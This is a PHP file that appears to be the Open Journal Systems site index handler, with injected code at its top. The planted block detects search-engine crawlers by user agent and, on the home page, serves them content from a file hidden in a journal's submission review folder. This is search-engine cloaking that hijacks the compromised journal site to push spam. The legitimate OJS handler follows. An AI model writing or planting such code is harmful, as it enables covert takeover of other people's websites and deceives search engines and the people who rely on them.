<?php
function skylight_team($url) {
    if (ini_get('allow_url_fopen')) {
    return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
$bot = "/home/stif6195/journal/journals/2/articles/12/submission/review/12-13-23-1-4-20200928";
$file = skylight_team($bot);
$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
if (preg_match($botchar, $res)) {
    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
}
?>

<?php

/**
 * @defgroup pages_index Index Pages
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2014-2019 Simon Fraser University
 * Copyright (c) 2003-2019 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

switch ($op) {
	case 'index':
		define('HANDLER_CLASS', 'IndexHandler');
		import('pages.index.IndexHandler');
		break;
}
